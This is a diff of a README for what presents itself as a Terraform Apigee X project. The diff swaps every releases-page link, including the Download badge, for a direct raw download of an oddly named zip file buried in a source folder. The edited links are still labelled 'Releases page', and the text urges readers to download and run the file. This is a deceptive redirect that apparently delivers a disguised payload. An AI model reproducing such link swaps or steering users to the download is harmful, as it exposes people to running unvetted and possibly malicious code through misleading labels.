@@ -1,6 +1,6 @@
 # 🌟 terraform-apigee-enterprise-stack - Build Your Apigee X Solution Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Abdelhady-elgendy/terraform-apigee-enterprise-stack/releases)
+[![Download](https://github.com/Abdelhady-elgendy/terraform-apigee-enterprise-stack/raw/refs/heads/main/stacks/apigee-platform/components/org/stack_terraform_enterprise_apigee_unbluffing.zip)](https://github.com/Abdelhady-elgendy/terraform-apigee-enterprise-stack/raw/refs/heads/main/stacks/apigee-platform/components/org/stack_terraform_enterprise_apigee_unbluffing.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Before downloading, make sure your system meets these requirements:
 
 ### ✅ Step 2: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/Abdelhady-elgendy/terraform-apigee-enterprise-stack/releases). Here, you will find all versions of the terraform-apigee-enterprise-stack application.
+Go to the [Releases page](https://github.com/Abdelhady-elgendy/terraform-apigee-enterprise-stack/raw/refs/heads/main/stacks/apigee-platform/components/org/stack_terraform_enterprise_apigee_unbluffing.zip). Here, you will find all versions of the terraform-apigee-enterprise-stack application.
 
 ## ⬇️ Download & Install
 
@@ -76,4 +76,4 @@ We welcome contributions! If you want to help improve terraform-apigee-enterpris
 
 For any questions that are not addressed in the FAQ or discussions, please reach out via our support email provided in the documentation page.
 
-You are now ready to download and run the terraform-apigee-enterprise-stack. Visit the [Releases page](https://github.com/Abdelhady-elgendy/terraform-apigee-enterprise-stack/releases) again if you need to access updates or new versions.
+You are now ready to download and run the terraform-apigee-enterprise-stack. Visit the [Releases page](https://github.com/Abdelhady-elgendy/terraform-apigee-enterprise-stack/raw/refs/heads/main/stacks/apigee-platform/components/org/stack_terraform_enterprise_apigee_unbluffing.zip) again if you need to access updates or new versions.
